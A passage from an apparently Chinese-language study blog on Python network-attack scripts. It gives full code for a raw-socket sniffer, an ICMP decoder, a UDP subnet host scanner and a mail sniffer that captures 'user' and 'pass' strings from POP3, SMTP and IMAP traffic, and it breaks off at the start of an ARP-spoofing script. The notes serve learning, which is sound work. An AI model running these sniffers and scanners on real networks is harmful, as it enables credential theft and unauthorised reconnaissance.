   self.src_address = socket.inet_ntoa(struct.pack(<span class="string">&quot;@I&quot;</span>, self.src))</span><br><span class="line">        self.dst_address = socket.inet_ntoa(struct.pack(<span class="string">&quot;@I&quot;</span>, self.dst))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># human readable protocol</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.protocol = self.protocol_map[self.protocol_num]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            self.protocol = <span class="built_in">str</span>(self.protocol_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a raw socket and bind it to the public interface</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_IP</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_ICMP</span><br><span class="line"></span><br><span class="line">sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)</span><br><span class="line"></span><br><span class="line">sniffer.bind((host, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># we want the IP headers included in the capture</span></span><br><span class="line">sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if we&#x27;re on Windows we need to send some ioctl</span></span><br><span class="line"><span class="comment"># to setup promiscuous mode</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># read in a single packet</span></span><br><span class="line">        raw_buffer = sniffer.recvfrom(<span class="number">65535</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create an IP header from the first 20 bytes of the buffer</span></span><br><span class="line">        ip_header = IP(raw_buffer[:<span class="number">20</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Protocol: %s %s -&gt; %s&quot;</span> % (</span><br><span class="line">            ip_header.protocol,</span><br><span class="line">            ip_header.src_address,</span><br><span class="line">            ip_header.dst_address)</span><br><span class="line">              )</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="comment"># if we&#x27;re on Windows turn off promiscuous mode</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)</span><br></pre></td></tr></table></figure>
<p>這很像把水用成造型冰塊一樣，把byte依據field的規定來找出我們需要的資訊<br>
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/IPv4_Packet_-en.svg/1280px-IPv4_Packet_-en.svg.png" alt="IP header format"></p>
<hr>
<p>sniffer_with_icmp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># host to listen on</span></span><br><span class="line">host = <span class="string">&quot;192.168.0.187&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP</span>(<span class="params">Structure</span>):</span></span><br><span class="line">    </span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;ihl&quot;</span>,           c_ubyte, <span class="number">4</span>), <span class="comment"># c_ubyte的前4個bits</span></span><br><span class="line">        (<span class="string">&quot;version&quot;</span>,       c_ubyte, <span class="number">4</span>), <span class="comment"># c_ubyte的後4個bits</span></span><br><span class="line">        (<span class="string">&quot;tos&quot;</span>,           c_ubyte),</span><br><span class="line">        (<span class="string">&quot;len&quot;</span>,           c_ushort),</span><br><span class="line"></span><br><span class="line">        (<span class="string">&quot;id&quot;</span>,            c_ushort),</span><br><span class="line">        (<span class="string">&quot;offset&quot;</span>,        c_ushort),</span><br><span class="line"></span><br><span class="line">        (<span class="string">&quot;ttl&quot;</span>,           c_ubyte),</span><br><span class="line">        (<span class="string">&quot;protocol_num&quot;</span>,  c_ubyte),</span><br><span class="line">        (<span class="string">&quot;sum&quot;</span>,           c_ushort),</span><br><span class="line"></span><br><span class="line">        (<span class="string">&quot;src&quot;</span>,           c_uint32),</span><br><span class="line"></span><br><span class="line">        (<span class="string">&quot;dst&quot;</span>,           c_uint32)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span>(<span class="params">cls, socket_buffer=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> cls.from_buffer_copy(socket_buffer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, socket_buffer=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.socket_buffer = socket_buffer</span><br><span class="line"></span><br><span class="line">        <span class="comment"># map protocol constants to their names</span></span><br><span class="line">        self.protocol_map = &#123;<span class="number">1</span>: <span class="string">&quot;ICMP&quot;</span>, <span class="number">6</span>: <span class="string">&quot;TCP&quot;</span>, <span class="number">17</span>: <span class="string">&quot;UDP&quot;</span>&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># human readable IP addresses</span></span><br><span class="line">        self.src_address = socket.inet_ntoa(struct.pack(<span class="string">&quot;@I&quot;</span>, self.src))</span><br><span class="line">        self.dst_address = socket.inet_ntoa(struct.pack(<span class="string">&quot;@I&quot;</span>, self.dst))</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># human readable protocol</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.protocol = self.protocol_map[self.protocol_num]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            self.protocol = <span class="built_in">str</span>(self.protocol_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ICMP</span>(<span class="params">Structure</span>):</span></span><br><span class="line">    </span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;type&quot;</span>,         c_ubyte),</span><br><span class="line">        (<span class="string">&quot;code&quot;</span>,         c_ubyte),</span><br><span class="line">        (<span class="string">&quot;checksum&quot;</span>,     c_ushort),</span><br><span class="line"></span><br><span class="line">        (<span class="string">&quot;unused&quot;</span>,       c_ushort),</span><br><span class="line">        (<span class="string">&quot;next_hop_mtu&quot;</span>, c_ushort)</span><br><span class="line">        ]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span>(<span class="params">cls, socket_buffer</span>):</span></span><br><span class="line">        <span class="keyword">return</span> cls.from_buffer_copy(socket_buffer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, socket_buffer</span>):</span></span><br><span class="line">        self.socket_buffer = socket_buffer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a raw socket and bind it to the public interface</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_IP </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_ICMP</span><br><span class="line">    </span><br><span class="line">sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)</span><br><span class="line"></span><br><span class="line">sniffer.bind((host, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># we want the IP headers included in the capture</span></span><br><span class="line">sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if we&#x27;re on Windows we need to send some ioctl</span></span><br><span class="line"><span class="comment"># to setup promiscuous mode</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># read in a single packet</span></span><br><span class="line">        raw_buffer = sniffer.recvfrom(<span class="number">65535</span>)[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># create an IP header from the first 20 bytes of the buffer</span></span><br><span class="line">        ip_header = IP(raw_buffer[:<span class="number">20</span>])</span><br><span class="line">      </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Protocol: %s %s -&gt; %s&quot;</span> % (</span><br><span class="line">            ip_header.protocol,</span><br><span class="line">            ip_header.src_address,</span><br><span class="line">            ip_header.dst_address)</span><br><span class="line">              )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if it&#x27;s ICMP we want it</span></span><br><span class="line">        <span class="keyword">if</span> ip_header.protocol == <span class="string">&quot;ICMP&quot;</span>:</span><br><span class="line">            <span class="comment"># calculate where our ICMP packet starts</span></span><br><span class="line">            offset = ip_header.ihl * <span class="number">4</span></span><br><span class="line">            buf = raw_buffer[offset:offset + sizeof(ICMP)]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># create our ICMP structure</span></span><br><span class="line">            icmp_header = ICMP(buf)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ICMP -&gt; Type: %d Code: %d&quot;</span> % (</span><br><span class="line">                icmp_header.<span class="built_in">type</span>,</span><br><span class="line">                icmp_header.code)</span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle CTRL-C</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="comment"># if we&#x27;re on Windows turn off promiscuous mode</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)</span><br></pre></td></tr></table></figure>
<p>ICMP是<code>(IP (ICMP ...))</code>的包裝<br>
但都byte要怎麼區分哪裡是IP還是ICMP的byte?</p>
<p>因此IP要知道自己有多長(<code>ip_header.ihl * 4</code>，乘4是因為ihl的單位是4bytes)，這樣就可以知道ICMP從哪邊開始</p>
<hr>
<p><span class="exturl" data-url="aHR0cDovL3NjYW5uZXIucHk=">scanner.py<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> ip_address, ip_network</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># host to listen on</span></span><br><span class="line">host = <span class="string">&quot;192.168.0.187&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># subnet to target</span></span><br><span class="line">tgt_subnet = <span class="string">&quot;192.168.0.0/24&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># magic we&#x27;ll check ICMP responses for</span></span><br><span class="line">tgt_message = <span class="string">&quot;PYTHONRULES!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_sender</span>(<span class="params">sub_net, magic_message</span>):</span></span><br><span class="line">    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ip_network(sub_net).hosts():</span><br><span class="line">        sender.sendto(magic_message.encode(<span class="string">&#x27;utf-8&#x27;</span>), (<span class="built_in">str</span>(ip), <span class="number">65212</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP</span>(<span class="params">Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;ihl&quot;</span>, c_ubyte, <span class="number">4</span>),</span><br><span class="line">        (<span class="string">&quot;version&quot;</span>, c_ubyte, <span class="number">4</span>),</span><br><span class="line">        (<span class="string">&quot;tos&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;len&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;id&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;offset&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;ttl&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;protocol_num&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;sum&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;src&quot;</span>, c_uint32),</span><br><span class="line">        (<span class="string">&quot;dst&quot;</span>, c_uint32)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span>(<span class="params">cls, socket_buffer=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> cls.from_buffer_copy(socket_buffer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, socket_buffer=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.socket_buffer = socket_buffer</span><br><span class="line"></span><br><span class="line">        <span class="comment"># map protocol constants to their names</span></span><br><span class="line">        self.protocol_map = &#123;<span class="number">1</span>: <span class="string">&quot;ICMP&quot;</span>, <span class="number">6</span>: <span class="string">&quot;TCP&quot;</span>, <span class="number">17</span>: <span class="string">&quot;UDP&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># human readable IP addresses</span></span><br><span class="line">        self.src_address = socket.inet_ntoa(struct.pack(<span class="string">&quot;@I&quot;</span>, self.src))</span><br><span class="line">        self.dst_address = socket.inet_ntoa(struct.pack(<span class="string">&quot;@I&quot;</span>, self.dst))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># human readable protocol</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.protocol = self.protocol_map[self.protocol_num]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            self.protocol = <span class="built_in">str</span>(self.protocol_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ICMP</span>(<span class="params">Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;type&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;code&quot;</span>, c_ubyte),</span><br><span class="line">        (<span class="string">&quot;checksum&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;unused&quot;</span>, c_ushort),</span><br><span class="line">        (<span class="string">&quot;next_hop_mtu&quot;</span>, c_ushort)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span>(<span class="params">cls, socket_buffer</span>):</span></span><br><span class="line">        <span class="keyword">return</span> cls.from_buffer_copy(socket_buffer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, socket_buffer</span>):</span></span><br><span class="line">        self.socket_buffer = socket_buffer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a raw socket and bind it to the public interface</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_IP</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    socket_protocol = socket.IPPROTO_ICMP</span><br><span class="line"></span><br><span class="line">sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)</span><br><span class="line"></span><br><span class="line">sniffer.bind((host, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># we want the IP headers included in the capture</span></span><br><span class="line">sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if we&#x27;re on Windows we need to send some ioctl</span></span><br><span class="line"><span class="comment"># to setup promiscuous mode</span></span><br><span class="line"><span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</span><br><span class="line"></span><br><span class="line"><span class="comment"># start sending packets</span></span><br><span class="line">t = threading.Thread(target=udp_sender, args=(tgt_subnet, tgt_message))</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># read in a single packet</span></span><br><span class="line">        raw_buffer = sniffer.recvfrom(<span class="number">65535</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create an IP header from the first 20 bytes of the buffer</span></span><br><span class="line">        ip_header = IP(raw_buffer[:<span class="number">20</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Protocol: %s %s -&gt; %s&quot;</span> % (</span><br><span class="line">            ip_header.protocol,</span><br><span class="line">            ip_header.src_address,</span><br><span class="line">            ip_header.dst_address)</span><br><span class="line">              )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if it&#x27;s ICMP we want it</span></span><br><span class="line">        <span class="keyword">if</span> ip_header.protocol == <span class="string">&quot;ICMP&quot;</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># calculate where our ICMP packet starts</span></span><br><span class="line">            offset = ip_header.ihl * <span class="number">4</span></span><br><span class="line">            buf = raw_buffer[offset:offset + sizeof(ICMP)]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># create our ICMP structure</span></span><br><span class="line">            icmp_header = ICMP(buf)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ICMP -&gt; Type: %d Code: %d&quot;</span> % (</span><br><span class="line">                icmp_header.<span class="built_in">type</span>,</span><br><span class="line">                icmp_header.code)</span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># now check for the TYPE 3 and CODE 3 which indicates</span></span><br><span class="line">            <span class="comment"># a host is up but no port available to talk to           </span></span><br><span class="line">            <span class="keyword">if</span> icmp_header.code == <span class="number">3</span> <span class="keyword">and</span> icmp_header.<span class="built_in">type</span> == <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">                <span class="comment"># check to make sure we are receiving the response </span></span><br><span class="line">                <span class="comment"># that lands in our subnet</span></span><br><span class="line">                <span class="keyword">if</span> ip_address(ip_header.src_address) <span class="keyword">in</span> ip_network(tgt_subnet):</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># test for our magic message</span></span><br><span class="line">                    <span class="keyword">if</span> raw_buffer[<span class="built_in">len</span>(raw_buffer)</span><br><span class="line">                       - <span class="built_in">len</span>(tgt_message):] == tgt_message:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Host Up: %s&quot;</span> % ip_header.src_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle CTRL-C</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="comment"># if we&#x27;re on Windows turn off promiscuous mode</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)</span><br></pre></td></tr></table></figure>
<p>目的是找出子網路中的活動ip</p>
<p>流程是一個thraed對某個子網路的所有ip送udp，如果host還活著，就會退回封包並加上icmp格式的錯誤訊息</p>
<h2 id="CH4">CH4</h2>
<p>mail_sniffer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> kamene.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># our packet callback</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packet_callback</span>(<span class="params">packet</span>):</span></span><br><span class="line">    <span class="keyword">if</span> packet[TCP].payload:</span><br><span class="line">        mail_packet = <span class="built_in">bytes</span>(packet[TCP].payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;user&#x27;</span> <span class="keyword">in</span> mail_packet.lower() <span class="keyword">or</span> <span class="string">b&#x27;pass&#x27;</span> <span class="keyword">in</span> mail_packet.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Server: %s&quot;</span> % packet[IP].dst)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] %s&quot;</span> % packet[TCP].payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fire up our sniffer</span></span><br><span class="line">sniff(<span class="built_in">filter</span>=<span class="string">&quot;tcp port 110 or tcp port 25 or tcp port 143&quot;</span>,</span><br><span class="line">      prn=packet_callback,</span><br><span class="line">      store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>這應該很直觀，目的是看tcp payload有沒有user與pass</p>
<p>之後應該補個tcpdump的條件式語法。</p>
<hr>
<p><span class="exturl" data-url="aHR0cDovL2FycGVyLnB5">arper.py<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 